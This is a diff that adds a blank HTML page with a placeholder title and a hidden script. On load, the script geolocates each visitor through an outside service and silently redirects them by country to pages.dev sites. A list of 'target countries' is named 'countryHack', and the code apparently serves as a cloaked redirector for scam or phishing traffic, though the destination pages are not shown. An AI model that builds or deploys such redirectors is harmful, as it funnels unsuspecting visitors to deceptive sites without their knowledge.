@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tu Título</title>
+</head>
+<body>
+    <script>
+        let countryHack = ['ES', 'GR', 'HU', 'HR', 'RS', 'GE', 'GT', 'AU', 'NZ']; // Paises objetivo
+        let urlPromocion = 'https://egrth.pages.dev/';
+        let country;
+
+        fetch('https://get.geojs.io/v1/ip/country')
+            .then((response) => response.text())
+            .then((data) => {
+                country = data.trim();
+                if (countryHack.includes(country)) {
+                    redirectURL(country);
+                } else {
+                    // Redirige a una URL de respaldo si el país no está en la lista
+                    window.location.href = urlPromocion;
+                }
+            });
+
+function redirectURL(country) {
+    // Agrega lógica personalizada para redirigir según el país aquí
+    if (country === 'ES') {
+        window.location.href = 'https://efrg.pages.dev/';
+    } else if (country === 'GR') {
+        window.location.href = 'https://egrth.pages.dev/';
+    } else if (country === 'HU') {
+        window.location.href = 'https://egrth.pages.dev/';
+    } else if (country === 'RS') {
+        window.location.href = 'https://egrth.pages.dev/';
+    } else {
+        // Si no se especifica un redireccionamiento para un país específico,
+        // redirige al scriptHack o a otra URL de respaldo
+        window.location.href = urlPromocion;
+    }
+}
+    </script>
+</body>
+</html>
